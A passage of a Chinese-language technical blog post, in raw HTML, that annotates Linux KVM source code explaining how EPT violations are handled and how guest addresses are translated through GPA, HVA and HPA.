class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>vcpu-&gt;arch.mmu.root_hpa = __pa(sp-&gt;spt);</code>可以看到EPT基地址用的是内核在内存模块拿到的页并转换为的物理地址，即HPA</p>\n<h4 id=\"CR3\"><a href=\"#CR3\" class=\"headerlink\" title=\"CR3\"></a>CR3</h4><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">vmx_set_cr3</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu, <span class=\"type\">unsigned</span> <span class=\"type\">long</span> cr3)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">long</span> guest_cr3;</span><br><span class=\"line\">\tu64 eptp;</span><br><span class=\"line\">\tguest_cr3 = cr3;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (enable_ept) &#123;</span><br><span class=\"line\">\t\teptp = construct_eptp(vcpu, cr3);</span><br><span class=\"line\">\t\tvmcs_write64(EPT_POINTER, eptp);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (is_paging(vcpu) || is_guest_mode(vcpu))</span><br><span class=\"line\">\t\t\tguest_cr3 = kvm_read_cr3(vcpu);</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t\t\tguest_cr3 = vcpu-&gt;kvm-&gt;arch.ept_identity_map_addr;</span><br><span class=\"line\">\t\tept_load_pdptrs(vcpu);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tvmx_flush_tlb(vcpu, <span class=\"literal\">true</span>);</span><br><span class=\"line\">\tvmcs_writel(GUEST_CR3, guest_cr3);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里的<code>vmx_set_cr3</code>一方面把用户的cr3写到VMCS中，另一方面把自己构造的EPT也写到VMCS中</p>\n<p>操作系统都会先在不开MMU的情况下配置页表，然后打开MMU，这些都不会下陷到VMM（不使用cr3，只使用ept）</p>\n<p>每次进入non-root模式会把当前VMCS的cr3赋值给cr3，使用cr3和VMCS的EPT</p>\n<h2 id=\"EPT-VIOLATION\"><a href=\"#EPT-VIOLATION\" class=\"headerlink\" title=\"EPT VIOLATION\"></a>EPT VIOLATION</h2><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">vmx_handle_exit</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (exit_reason &lt; kvm_vmx_max_exit_handlers</span><br><span class=\"line\">\t    &amp;&amp; kvm_vmx_exit_handlers[exit_reason])</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> kvm_vmx_exit_handlers[exit_reason](vcpu);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"GVA-GPA\"><a href=\"#GVA-GPA\" class=\"headerlink\" title=\"GVA-&gt;GPA\"></a>GVA-&gt;GPA</h3><p>Guest的GVA-&gt;GPA缺页异常由自己完成，<code>EPT_VIOLATION</code>只存在于存在GVA-&gt;GPA但不存在GPA-&gt;HPA的情况</p>\n<p>发生<code>EPT_VIOLATION</code>前 异常的GPA会被自动保存到当前VMCS的<code>GUEST_PHYSICAL_ADDRESS</code>字段</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">handle_ept_violation</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">gpa_t</span> gpa=vmcs_read64(GUEST_PHYSICAL_ADDRESS);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> kvm_mmu_page_fault(vcpu, gpa, error_code, <span class=\"literal\">NULL</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">kvm_mmu_page_fault</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu, <span class=\"type\">gpa_t</span> cr2_or_gpa, u64 error_code,</span></span><br><span class=\"line\"><span class=\"params\">\t\t       <span class=\"type\">void</span> *insn, <span class=\"type\">int</span> insn_len)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tr = vcpu-&gt;arch.mmu.page_fault(vcpu, cr2_or_gpa,</span><br><span class=\"line\">\t\t\t\t\t       lower_32_bits(error_code),<span class=\"literal\">false</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (r == RET_PF_RETRY)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (r &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> r;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">tdp_page_fault</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu, <span class=\"type\">gpa_t</span> gpa, u32 error_code,<span class=\"type\">bool</span> prefault)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">kvm_pfn_t</span> pfn;</span><br><span class=\"line\">\t<span class=\"type\">int</span> r;</span><br><span class=\"line\">\t<span class=\"type\">int</span> level;</span><br><span class=\"line\">\t<span class=\"type\">bool</span> force_pt_level;</span><br><span class=\"line\">\t<span class=\"type\">gfn_t</span> gfn = gpa &gt;&gt; PAGE_SHIFT;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">long</span> mmu_seq;</span><br><span class=\"line\">\t<span class=\"type\">int</span> write = error_code &amp; PFERR_WRITE_MASK;</span><br><span class=\"line\">\t<span class=\"type\">bool</span> map_writable;</span><br><span class=\"line\">\t<span class=\"type\">bool</span> lpage_disallowed = (error_code &amp; PFERR_FETCH_MASK) &amp;&amp;</span><br><span class=\"line\">\t\t\t\tis_nx_huge_page_enabled();</span><br><span class=\"line\"></span><br><span class=\"line\">\tMMU_WARN_ON(!VALID_PAGE(vcpu-&gt;arch.mmu.root_hpa));</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (page_fault_handle_page_track(vcpu, error_code, gfn))</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> RET_PF_EMULATE;</span><br><span class=\"line\"></span><br><span class=\"line\">\tr = mmu_topup_memory_caches(vcpu);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (r)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> r;</span><br><span class=\"line\"></span><br><span class=\"line\">\tforce_pt_level =</span><br><span class=\"line\">\t\tlpage_disallowed ||</span><br><span class=\"line\">\t\t!check_hugepage_cache_consistency(vcpu, gfn, PT_DIRECTORY_LEVEL);</span><br><span class=\"line\">\tlevel = mapping_level(vcpu, gfn, &amp;force_pt_level);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (likely(!force_pt_level)) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (level &gt; PT_DIRECTORY_LEVEL &amp;&amp;</span><br><span class=\"line\">\t\t    !check_hugepage_cache_consistency(vcpu, gfn, level))</span><br><span class=\"line\">\t\t\tlevel = PT_DIRECTORY_LEVEL;</span><br><span class=\"line\">\t\tgfn &amp;= ~(KVM_PAGES_PER_HPAGE(level) - <span class=\"number\">1</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (fast_page_fault(vcpu, gpa, level, error_code))</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> RET_PF_RETRY;</span><br><span class=\"line\"></span><br><span class=\"line\">\tmmu_seq = vcpu-&gt;kvm-&gt;mmu_notifier_seq;</span><br><span class=\"line\">\tsmp_rmb();</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (try_async_pf(vcpu, prefault, gfn, gpa, &amp;pfn, write, &amp;map_writable))</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> RET_PF_RETRY;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (handle_abnormal_pfn(vcpu, <span class=\"number\">0</span>, gfn, pfn, ACC_ALL, &amp;r))</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> r;</span><br><span class=\"line\"></span><br><span class=\"line\">\tr = RET_PF_RETRY;</span><br><span class=\"line\">\tspin_lock(&amp;vcpu-&gt;kvm-&gt;mmu_lock);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (mmu_notifier_retry(vcpu-&gt;kvm, mmu_seq))</span><br><span class=\"line\">\t\t<span class=\"keyword\">goto</span> out_unlock;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (make_mmu_pages_available(vcpu) &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">goto</span> out_unlock;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (likely(!force_pt_level))</span><br><span class=\"line\">\t\ttransparent_hugepage_adjust(vcpu, gfn, &amp;pfn, &amp;level);</span><br><span class=\"line\">\tr = __direct_map(vcpu, gpa, write, map_writable, level, pfn,</span><br><span class=\"line\">\t\t\t prefault, lpage_disallowed);</span><br><span class=\"line\">out_unlock:</span><br><span class=\"line\">\tspin_unlock(&amp;vcpu-&gt;kvm-&gt;mmu_lock);</span><br><span class=\"line\">\tkvm_release_pfn_clean(pfn);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> r;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"GPA-HVA\"><a href=\"#GPA-HVA\" class=\"headerlink\" title=\"GPA-&gt;HVA\"></a>GPA-&gt;HVA</h3><p>先根据memslot做GPA-&gt;HVA</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">bool</span> <span class=\"title function_\">try_async_pf</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu, <span class=\"type\">bool</span> prefault, <span class=\"type\">gfn_t</span> gfn,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t <span class=\"type\">gpa_t</span> cr2_or_gpa, <span class=\"type\">kvm_pfn_t</span> *pfn, <span class=\"type\">bool</span> write,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t <span class=\"type\">bool</span> *writable)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">kvm_memory_slot</span> *<span class=\"title\">slot</span>;</span></span><br><span class=\"line\">\t<span class=\"type\">bool</span> async;</span><br><span class=\"line\"></span><br><span class=\"line\">\tslot = kvm_vcpu_gfn_to_memslot(vcpu, gfn);</span><br><span class=\"line\">\tasync = <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t*pfn = __gfn_to_pfn_memslot(slot, gfn, <span class=\"literal\">false</span>, &amp;async, write, writable);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!async)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>; <span class=\"comment\">/* *pfn has correct page already */</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!prefault &amp;&amp; kvm_can_do_async_pf(vcpu)) &#123;</span><br><span class=\"line\">\t\ttrace_kvm_try_async_get_page(cr2_or_gpa, gfn);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (kvm_find_async_pf_gfn(vcpu, gfn)) &#123;</span><br><span class=\"line\">\t\t\ttrace_kvm_async_pf_doublefault(cr2_or_gpa, gfn);</span><br><span class=\"line\">\t\t\tkvm_make_request(KVM_REQ_APF_HALT, vcpu);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t\t&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (kvm_arch_setup_async_pf(vcpu, cr2_or_gpa, gfn))</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t*pfn = __gfn_to_pfn_memslot(slot, gfn, <span class=\"literal\">false</span>, <span class=\"literal\">NULL</span>, write, writable);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里pfn并没有检查返回值，如果是错误情况会在后面用到的时候进行处理</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">kvm_pfn_t</span> __gfn_to_pfn_memslot(<span class=\"keyword\">struct</span> kvm_memory_slot *slot, <span class=\"type\">gfn_t</span> gfn,</span><br><span class=\"line\">\t\t\t       <span class=\"type\">bool</span> atomic, <span class=\"type\">bool</span> *async, <span class=\"type\">bool</span> write_fault,</span><br><span class=\"line\">\t\t\t       <span class=\"type\">bool</span> *writable)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">long</span> addr = __gfn_to_hva_many(slot, gfn, <span class=\"literal\">NULL</span>, write_fault);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (addr == KVM_HVA_ERR_RO_BAD) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (writable)</span><br><span class=\"line\">\t\t\t*writable = <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> KVM_PFN_ERR_RO_FAULT;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (kvm_is_error_hva(addr)) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (writable)</span><br><span class=\"line\">\t\t\t*writable = <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> KVM_PFN_NOSLOT;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (writable &amp;&amp; memslot_is_readonly(slot)) &#123;</span><br><span class=\"line\">\t\t*writable = <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t\twritable = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> hva_to_pfn(addr, atomic, async, write_fault,</span><br><span class=\"line\">\t\t\t  writable);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>__gfn_to_hva_many</code>-&gt;<code>__gfn_to_hva_memslot</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"keyword\">inline</span> <span class=\"type\">unsigned</span> <span class=\"type\">long</span></span><br><span class=\"line\">__gfn_to_hva_memslot(<span class=\"keyword\">struct</span> kvm_memory_slot *slot, <span class=\"type\">gfn_t</span> gfn)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">long</span> offset = gfn - slot-&gt;base_gfn;</span><br><span class=\"line\">\toffset = array_index_nospec(offset, slot-&gt;npages);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> slot-&gt;userspace_addr + offset * PAGE_SIZE;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里返回的hva是guest发生page fault的GPA对应的HVA</p>\n<p><code>KVM_PFN_NOSLOT</code>会在<code>set_spte</code>中通过<code>is_noslot_pfn</code> <code>mark_mmio_spte</code>特殊处理 下一次访问会触发EPT misconfig</p>\n<h3 id=\"HVA-HPA\"><a href=\"#HVA-HPA\" class=\"headerlink\" title=\"HVA-&gt;HPA\"></a>HVA-&gt;HPA</h3><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">kvm_pfn_t</span> <span class=\"title function_\">hva_to_pfn</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">long</span> addr, <span class=\"type\">bool</span> atomic, <span class=\"type\">bool</span> *async,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t<span class=\"type\">bool</span> write_fault, <span class=\"type\">bool</span> *writable)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">vm_area_struct</span> *<span class=\"title\">vma</span>;</span></span><br><span class=\"line\">\t<span class=\"type\">kvm_pfn_t</span> pfn = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"type\">int</span> npages, r;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (hva_to_pfn_fast(addr, atomic, async, write_fault, writable, &amp;pfn))</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> pfn;</span><br><span class=\"line\">\tnpages = hva_to_pfn_slow(addr, async, write_fault, writable, &amp;pfn);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (npages == <span class=\"number\">1</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> pfn;</span><br><span class=\"line\">\tdown_read(&amp;current-&gt;mm-&gt;mmap_sem);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (npages == -EHWPOISON ||</span><br><span class=\"line\">\t      (!async &amp;&amp; check_user_page_hwpoison(addr))) &#123;</span><br><span class=\"line\">\t\tpfn = KVM_PFN_ERR_HWPOISON;</span><br><span class=\"line\">\t\t<span class=\"keyword\">goto</span> <span class=\"built_in\">exit</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">retry:</span><br><span class=\"line\">\tvma = find_vma_intersection(current-&gt;mm, addr, addr + <span class=\"number\">1</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (vma == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">\t\tpfn = KVM_PFN_ERR_FAULT;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (vma-&gt;vm_flags &amp; (VM_IO | VM_PFNMAP)) &#123;</span><br><span class=\"line\">\t\tr = hva_to_pfn_remapped(vma, addr, async, write_fault, writable, &amp;pfn);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (r == -EAGAIN)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">goto</span> retry;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (r &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t\tpfn = KVM_PFN_ERR_FAULT;</span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (async &amp;&amp; vma_is_valid(vma, write_fault))</span><br><span class=\"line\">\t\t\t*async = <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t\tpfn = KVM_PFN_ERR_FAULT;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"><span class=\"built_in\">exit</span>:</span><br><span class=\"line\">\tup_read(&amp;current-&gt;mm-&gt;mmap_sem);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> pfn;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>通过mm模块的<code>find_vma_intersection</code>找到和[addr,addr+1)相交的VMA，如果不存在说明HVA是错的(用户态memslot申请的地址空间并没有用malloc或mmap获取)</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">hva_to_pfn_remapped</span><span class=\"params\">(<span class=\"keyword\">struct</span> vm_area_struct *vma,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t       <span class=\"type\">unsigned</span> <span class=\"type\">long</span> addr, <span class=\"type\">bool</span> *async,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t       <span class=\"type\">bool</span> write_fault, <span class=\"type\">bool</span> *writable,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t       <span class=\"type\">kvm_pfn_t</span> *p_pfn)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">kvm_pfn_t</span> pfn;</span><br><span class=\"line\">\t<span class=\"type\">pte_t</span> *ptep;</span><br><span class=\"line\">\t<span class=\"type\">spinlock_t</span> *ptl;</span><br><span class=\"line\">\t<span class=\"type\">int</span> r;</span><br><span class=\"line\">\tr = follow_pte_pmd(vma-&gt;vm_mm, addr, <span class=\"literal\">NULL</span>, <span class=\"literal\">NULL</span>, &amp;ptep, <span class=\"literal\">NULL</span>, &amp;ptl);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (r) &#123;</span><br><span class=\"line\">\t\t<span class=\"type\">bool</span> unlocked = <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t\tr = fixup_user_fault(current, current-&gt;mm, addr,</span><br><span class=\"line\">\t\t\t\t     (write_fault ? FAULT_FLAG_WRITE : <span class=\"number\">0</span>), &amp;unlocked);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (unlocked)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> -EAGAIN;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (r)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> r;</span><br><span class=\"line\">\t\tr = follow_pte_pmd(vma-&gt;vm_mm, addr, <span class=\"literal\">NULL</span>, <span class=\"literal\">NULL</span>, &amp;ptep, <span class=\"literal\">NULL</span>, &amp;ptl);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (r)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> r;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (write_fault &amp;&amp; !pte_write(*ptep)) &#123;</span><br><span class=\"line\">\t\tpfn = KVM_PFN_ERR_RO_FAULT;</span><br><span class=\"line\">\t\t<span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (writable)</span><br><span class=\"line\">\t\t*writable = pte_write(*ptep);</span><br><span class=\"line\">\tpfn = pte_pfn(*ptep);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!kvm_try_get_pfn(pfn))</span><br><span class=\"line\">\t\tr = -EFAULT;</span><br><span class=\"line\">out:</span><br><span class=\"line\">\tpte_unmap_unlock(ptep, ptl);</span><br><span class=\"line\">\t*p_pfn = pfn;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> r;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> __follow_pte_pmd(<span class=\"keyword\">struct</span> mm_struct *mm, <span class=\"type\">unsigned</span> <span class=\"type\">long</span> address,</span><br><span class=\"line\">\t\t\t    <span class=\"type\">unsigned</span> <span class=\"type\">long</span> *start, <span class=\"type\">unsigned</span> <span class=\"type\">long</span> *end,</span><br><span class=\"line\">\t\t\t    <span class=\"type\">pte_t</span> **ptepp, <span class=\"type\">pmd_t</span> **pmdpp, <span class=\"type\">spinlock_t</span> **ptlp)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">pgd_t</span> *pgd;</span><br><span class=\"line\">\t<span class=\"type\">p4d_t</span> *p4d;</span><br><span class=\"line\">\t<span class=\"type\">pud_t</span> *pud;</span><br><span class=\"line\">\t<span class=\"type\">pmd_t</span> *pmd;</span><br><span class=\"line\">\t<span class=\"type\">pte_t</span> *ptep;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpgd = pgd_offset(mm, address);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (pgd_none(*pgd) || unlikely(pgd_bad(*pgd)))</span><br><span class=\"line\">\t\t<span class=\"keyword\">goto</span> out;</span><br><span class=\"line\"></span><br><span class=\"line\">\tp4d = p4d_offset(pgd, address);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (p4d_none(*p4d) || unlikely(p4d_bad(*p4d)))</span><br><span class=\"line\">\t\t<span class=\"keyword\">goto</span> out;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpud = pud_offset(p4d, address);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (pud_none(*pud) || unlikely(pud_bad(*pud)))</span><br><span class=\"line\">\t\t<span class=\"keyword\">goto</span> out;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpmd = pmd_offset(pud, address);</span><br><span class=\"line\">\tVM_BUG_ON(pmd_trans_huge(*pmd));</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (pmd_huge(*pmd)) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (!pmdpp)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">goto</span> out;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (start &amp;&amp; end) &#123;</span><br><span class=\"line\">\t\t\t*start = address &amp; PMD_MASK;</span><br><span class=\"line\">\t\t\t*end = *start + PMD_SIZE;</span><br><span class=\"line\">\t\t\tmmu_notifier_invalidate_range_start(mm, *start, *end);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t*ptlp = pmd_lock(mm, pmd);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (pmd_huge(*pmd)) &#123;</span><br><span class=\"line\">\t\t\t*pmdpp = pmd;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tspin_unlock(*ptlp);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (start &amp;&amp; end)</span><br><span class=\"line\">\t\t\tmmu_notifier_invalidate_range_end(mm, *start, *end);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (pmd_none(*pmd) || unlikely(pmd_bad(*pmd)))</span><br><span class=\"line\">\t\t<span class=\"keyword\">goto</span> out;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (start &amp;&amp; end) &#123;</span><br><span class=\"line\">\t\t*start = address &amp; PAGE_MASK;</span><br><span class=\"line\">\t\t*end = *start + PAGE_SIZE;</span><br><span class=\"line\">\t\tmmu_notifier_invalidate_range_start(mm, *start, *end);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tptep = pte_offset_map_lock(mm, pmd, address, ptlp);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!pte_present(*ptep))</span><br><span class=\"line\">\t\t<span class=\"keyword\">goto</span> unlock;</span><br><span class=\"line\">\t*ptepp = ptep;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">unlock:</span><br><span class=\"line\">\tpte_unmap_unlock(ptep, *ptlp);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (start &amp;&amp; end)</span><br><span class=\"line\">\t\tmmu_notifier_invalidate_range_end(mm, *start, *end);</span><br><span class=\"line\">out:</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> -EINVAL;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//arch/arc/include/asm/pgtable.h</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> pgd_index(addr)\t\t((addr) &gt;&gt; PGDIR_SHIFT)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> pgd_offset(mm, addr)\t(((mm)-&gt;pgd)+pgd_index(addr))</span></span><br></pre></td></tr></table></figure>\n\n<p>pgd p4d pud pmd分别是一二三四级页表，直接通过一些宏直接来索引。</p>\n<p>这里通过内核中维护的当前进程的页表信息找到EPT中缺失的HVA-&gt;HPA，也就是说当前进程页表拥有的HVA-&gt;HPA映射处于某种原因没有被更新到EPT上</p>\n<p>如果进程页表中也不存在对应的页表项，说明对该进程发生了一般的page fault，调用</p>\n<p><code>fixup_user_fault</code>-&gt;<code>handle_mm_fault</code>-&gt;<code>__handle_mm_fault</code>处理</p>\n<p>内核mm模块保证了这时HPA对应的VMA、物理页、进程页表都存在且合法，后续把GVA-&gt;HPA加入EPT即可</p>\n<p>写保护？</p>\n<p>换页？</p>\n<h3 id=\"遍历页表\"><a href=\"#遍历页表\" class=\"headerlink\" title=\"遍历页表\"></a>遍历页表</h3><p>shadow_addr &#x3D; root_hpa &#x3D; EPT的基地址</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> for_each_shadow_entry(_vcpu, _addr, _walker)    \\</span></span><br><span class=\"line\"><span class=\"meta\">\tfor (shadow_walk_init(&amp;(_walker), _vcpu, _addr);\t\\</span></span><br><span class=\"line\"><span class=\"meta\">\t     shadow_walk_okay(&amp;(_walker));\t\t\t\\</span></span><br><span class=\"line\"><span class=\"meta\">\t     shadow_walk_next(&amp;(_walker)))</span></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">shadow_walk_init</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_shadow_walk_iterator *iterator,</span></span><br><span class=\"line\"><span 